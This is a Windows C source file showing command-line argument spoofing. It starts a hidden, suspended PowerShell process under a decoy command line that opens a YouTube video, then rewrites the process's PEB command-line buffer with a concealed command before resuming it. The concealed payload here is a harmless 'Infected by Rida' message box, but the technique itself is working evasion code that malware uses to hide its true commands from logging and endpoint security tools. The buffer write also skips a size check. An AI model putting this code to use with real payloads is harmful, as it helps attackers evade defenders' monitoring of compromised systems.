#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <winternl.h>

/*
    We spawn a suspended process & edit it's _RTL_USER_PROCESS_PARAMETERS PEB element for what we want
    Step by step : 
        step 1 : Spawn process suspended
        step 2 : Use NtQueryInformationProcess with ProcessBasicInformation to get the PEB addr
        step 3 : use ReadFromTargetProcess to get _RTL_USER_PROCESS_PARAMETERS structure
        step 4 : et ecrire dans le Buffer la nouvelle valeur + changé la lenght
*/

//------------------------------------ Types pour NtQueryInformationProcess ------------------------
typedef NTSTATUS (NTAPI *_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);
//-------------------------------------------------------------------------------------------------

BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T  sNmbrOfBytesRead    = 0;

    *ppReadBuffer = calloc(1, dwBufferSize);
    if (*ppReadBuffer == NULL) {
        printf("[!] calloc failed\n");
        return FALSE;
    }

    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
        printf("[!] ReadProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Read : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesRead, (unsigned long long)dwBufferSize);
        free(*ppReadBuffer);
        *ppReadBuffer = NULL;
        return FALSE;
    }

    return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten  = 0;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
        printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

int main(int argc, char** argv) {
    STARTUPINFOW                  Si       = { 0 };
    PROCESS_INFORMATION           Pi       = { 0 };
    ZeroMemory(&Si, sizeof(STARTUPINFOW));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    PROCESS_BASIC_INFORMATION     PBI      = { 0 };

    PPEB                          pPeb     = NULL;
    PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;

    // Getting the address of the NtQueryInformationProcess function
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
      printf("[!] GetProcAddress(NtQueryInformationProcess) failed\n");
      return FALSE;
    }

    WCHAR realStartupArgs[] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')\"";
    WCHAR fakeStartupArgs[] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";

    if (!CreateProcessW(
      NULL,
      fakeStartupArgs,
      NULL,
      NULL,
      FALSE,
      CREATE_SUSPENDED | CREATE_NO_WINDOW,      // process suspended & with no window
      NULL,
      NULL,
      &Si,
      &Pi)) {
      printf("\t[!] CreateProcessW Failed with Error : %u \n", GetLastError());
      return FALSE;
    }
    wprintf(L"[+] Created process with fake arg : \n\t%s\n", fakeStartupArgs);

    ULONG ret  = 0;
    // We get the Process Basic info for the PEB
    NTSTATUS status = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &ret);
    if (!NT_SUCCESS(status)) {
      printf("\t[!] NtQueryInformationProcess Failed With NTSTATUS : 0x%08x \n", (unsigned)status);
      return FALSE;
    }
    // Maintenant PBI est populé !
    wprintf(L"[+] Query ProcessBasicInformation !\n");
    
    // on lit le PEB en utilisant l'addr de PBI.PebBaseAddress 
    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) {
      printf("\t[!] Failed To Read Target's Process Peb \n");
      return FALSE;
    }
    wprintf(L"[+] Gotten PEB from PBI.PebBaseAddress !\n");

    // maintenant on récupère l'élément RTL_USER_PROCESS_PARAMETERS de cette peb 
    // ici on lit plus car on ne sais pas la taille de la UNICODE string
    // taille: structure + padding pour éviter lecture incomplète
    SIZE_T parmsReadSize = sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF;
    if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, parmsReadSize)) {
      printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
      free(pPeb);
      return FALSE;
    }
    wprintf(L"[+] Gotten RTL_USER_PROCESS_PARAMETERS from PEB !\n");

    // Calculer taille en octets de la chaîne réelle (+terminateur) 
    /*
      Selon microsoft lstrlenW : "Determines the length of the specified string (not including the terminating null character)."
    */
    SIZE_T realArgsChars = lstrlenW(realStartupArgs) + 1;
    SIZE_T realArgsBytes = realArgsChars * sizeof(WCHAR);

    // Remote buffer where CommandLine.Buffer points to (valeur lue depuis pParms local)
    PWSTR remoteCmdBuffer = pParms->CommandLine.Buffer;
    if (remoteCmdBuffer == NULL) {
        printf("\t[!] Target's CommandLine.Buffer is NULL\n");
        free(pPeb);
        free(pParms);
        return FALSE;
    }

    // Ecrire la chaîne réelle DANS le buffer distant pointé par CommandLine.Buffer
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)remoteCmdBuffer, (PVOID)realStartupArgs, realArgsBytes)) {
        printf("\t[!] Failed To Write The Real Parameters Into Remote Buffer\n");
        free(pPeb);
        free(pParms);
        return FALSE;
    }

    // CommandLine.Length est en octets (USHORT) -> on écrit la longueur en octets (sans compter le potential MaximumLength)
    USHORT szRealArgsBytesUS = (USHORT)(realArgsBytes & 0xFFFF);
    // Adresse distante du champ Length : base ProcessParameters + offset
    PBYTE remoteParamsBase = (PBYTE)pPeb->ProcessParameters;
    PVOID remoteLengthFieldAddr = (PVOID)(remoteParamsBase + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length));

    if (!WriteToTargetProcess(Pi.hProcess, remoteLengthFieldAddr, (PVOID)&szRealArgsBytesUS, sizeof(USHORT))) {
        printf("\t[!] Failed To Write The Real Parameters Length\n");
        free(pPeb);
        free(pParms);
        return FALSE;
    }

    wprintf(L"[+] Overwritten fake args with real args: \n\t%s\n", realStartupArgs);

    free(pPeb);
    free(pParms);

    ResumeThread(Pi.hThread);

    WaitForSingleObject(Pi.hProcess, INFINITE);
    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    return 0;
}
